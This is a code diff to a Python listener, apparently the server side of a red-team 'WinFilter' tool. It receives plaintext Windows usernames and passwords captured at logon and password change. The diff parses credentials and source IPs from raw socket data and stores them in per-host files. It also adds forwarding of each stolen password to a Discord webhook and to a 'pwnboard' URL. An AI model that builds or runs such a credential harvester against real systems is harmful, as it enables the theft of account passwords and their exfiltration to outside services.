@@ -7,36 +7,39 @@ import datetime
 
 print_lock = threading.Lock()
 
-
-def handle_client(conn, addr):
+def handle_client(conn, addr, args):
     data = conn.recv(1024)
-    strData = str(data)
-    # print(strData) #debugging
-    if "@@" in strData:  # winlogon
+    print("TEST ", data)
+    password = (data[data.index(b"\x11") + 1 : data.index(b"\x12")]).decode('ascii', errors='ignore')
+
+    if b"\x40\x40" in data: # @@ 
         type = "WinLogon"
-        username = strData[2 : strData.find("@@")]
+        username = (data[ : data.index(b"\x40\x40")]).decode('ascii', errors='ignore')
     else:
         type = "Password Change"
-        username = strData[2 : strData.find(":")]
-    password = strData[strData.find(":") + 1 : strData.find(";end")]
+        username = (data[ : data.index(b"\x11")]).decode('ascii', errors='ignore')
+    if "cloudbase" in username:
+        return
+
     timestamp = datetime.datetime.now().strftime("%G-%m-%d %H:%M:%S")
-    ip = strData[
-        strData.find("end;") + 4 : len(strData) - 2
-    ]  # change this to ;ip and then ;end
+    ip = (data[data.index(b"\x12") + 1 : data.index(b"\x13")]).decode('ascii', errors='ignore')
     storage = f"\nTimestamp: {timestamp}\nSource: {ip}\nType: {type}\nUsername: {username} \nPassword: {password}\n\n"
     print(storage)
 
-    # discordWH(ip, username, password)
+    if args.discord != "X":
+        discordWH(ip, username, password, args.discord)
 
-    writeFile(storage, ip)
+    if args.write:
+        writeFile(storage, ip)
+
+    if args.pwnboard != "X":
+        updatePwnboard(ip, username, password, args.pwnboard)
 
     if not data:
         print_lock.release()
 
 
-def discordWH(addr, username, password):
-    url = ""
-
+def discordWH(addr, username, password, url):
     # Setup Post Request
     post = {}
     data = {"content": f"{addr} | {username}:{password}", "username": "WinFilter"}
@@ -50,6 +53,12 @@ def discordWH(addr, username, password):
     else:
         print("Payload delivered successfully, code {}.".format(result.status_code))
 
+def updatePwnboard(ip, username, password, url):
+    data = {'ip': ip, 'service': 'system', 'username': username, 'password': password, 'message': "credentials from winfilter"}
+    try:
+        req = requests.post(url, json=data, timeout=3)
+    except Exception as E:
+        print(E)
 
 def writeFile(storage, ip):
     with open(f"creds/{ip}", "a") as f:
@@ -87,6 +96,22 @@ def main():
         default="0.0.0.0",
     )
     parser.add_argument(
+        "--pwnboard",
+        type=str,
+        nargs="?",
+        const=1,
+        help="pwnboard url to utilize",
+        default="X"
+    )
+    parser.add_argument(
+        "--discord",
+        type=str,
+        nargs="?",
+        const=1,
+        help="discord url to utilize",
+        default="X"
+    )
+    parser.add_argument(
         "--port",
         type=int,
         nargs="?",
@@ -94,13 +119,13 @@ def main():
         help="Port to listen on (default: 80)",
         default=80,
     )
-    parser.add_argument("--clean", dest="clean", action="store_true")
-    parser.set_defaults(clean=False)
+    parser.add_argument("--write", dest="write", action="store_true")
+    parser.set_defaults(write=False)
     args = parser.parse_args()
 
-    if args.clean:
-        os.system("rm -rf creds; mkdir creds")
-
+    if args.write:
+        os.system("mkdir -p creds")
+    
     s = socket.socket()
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     print(f"Listening on {args.ip}:{args.port}\n")
@@ -110,11 +135,10 @@ def main():
     try:
         while True:
             conn, addr = s.accept()
-            t = threading.Thread(target=handle_client, args=(conn, addr))
+            t = threading.Thread(target=handle_client, args=(conn, addr, args,))
             t.start()
 
     except KeyboardInterrupt:
-        print("\nArrivederci!")
         exit(0)
 
 
